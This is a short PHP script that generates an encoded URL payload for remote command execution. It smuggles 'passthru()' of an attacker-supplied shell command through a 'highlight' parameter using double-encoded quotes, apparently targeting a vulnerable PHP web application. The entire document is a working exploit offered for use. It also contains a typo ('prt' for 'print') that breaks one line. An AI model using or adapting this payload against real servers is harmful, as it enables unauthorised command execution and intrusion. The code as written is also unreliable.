<?
$rush='ls -al'; //do what
$highlight='passthru($HTTP_GET_VARS[rush])'; // dont touch

print "?t=%37&rush=";

for ($i=0; $i<strlen($rush); ++$i) {
 print '%' . bin2hex(substr($rush,$i,1));
}

print "&highlight=%2527.";

for ($i=0; $i<strlen($highlight); ++$i) {
 prt '%' . bin2hex(substr($highlight,$i,1));
}

print ".%2527";
?>

